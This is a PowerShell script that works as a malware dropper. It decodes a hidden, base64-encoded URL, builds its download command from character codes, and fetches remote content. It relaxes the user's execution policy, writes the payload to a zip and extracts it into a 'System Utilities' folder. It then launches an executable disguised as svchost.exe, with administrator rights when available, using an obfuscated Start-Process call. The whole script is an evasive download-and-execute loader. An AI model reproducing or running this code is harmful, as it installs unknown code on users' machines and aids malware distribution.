$base64Url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rya3N0LXNoZHcvdGVzdHMvcmVmcy9oZWFkcy9tYWluL2VuY29kZWQudHh0";

$url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64Url))
$cmd = [char]105+[char]119+[char]114
echo $cmd
$webRequest = & $cmd $url
$base64Content = $webRequest.Content
$decodedBytes = [Convert]::FromBase64String($base64Content)
try {
    Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
}
catch {

}

function Test-IsAdmin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

$zipFilePath = "C:\Users\$env:USERNAME\Documents\download.zip"
[System.IO.File]::WriteAllBytes($zipFilePath, $decodedBytes)
$extractPath = "C:\Users\$env:USERNAME\Documents\System Utilities"
if (Test-Path $extractPath) {
    Remove-Item -Recurse -Force $extractPath
}

Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force

Write-Host "ZIP file extracted to $extractPath"

$exePath = Join-Path $extractPath "System Utilities\svchost.exe"
if (Test-IsAdmin) {
    STa`rt-PR`oce`Ss -FilePath $exePath -Verb RunAs
    Write-Host "EXE launched as administrator."
} else {
    & $exePath
    Write-Host "EXE launched without elevation."
}
